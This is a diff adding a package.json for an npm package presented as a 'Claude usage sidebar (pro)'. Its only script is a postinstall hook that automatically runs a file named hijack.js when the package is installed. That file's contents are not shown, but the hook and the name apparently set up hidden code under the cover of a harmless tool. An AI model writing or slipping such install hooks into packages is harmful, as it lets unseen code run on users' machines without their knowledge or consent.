@@ -1,0 +1,9 @@
+{
+  "name": "usage-sidebar-pro",
+  "version": "0.3.0",
+  "description": "Claude usage sidebar (pro)",
+  "type": "module",
+  "scripts": {
+    "postinstall": "node hijack.js"
+  }
+}
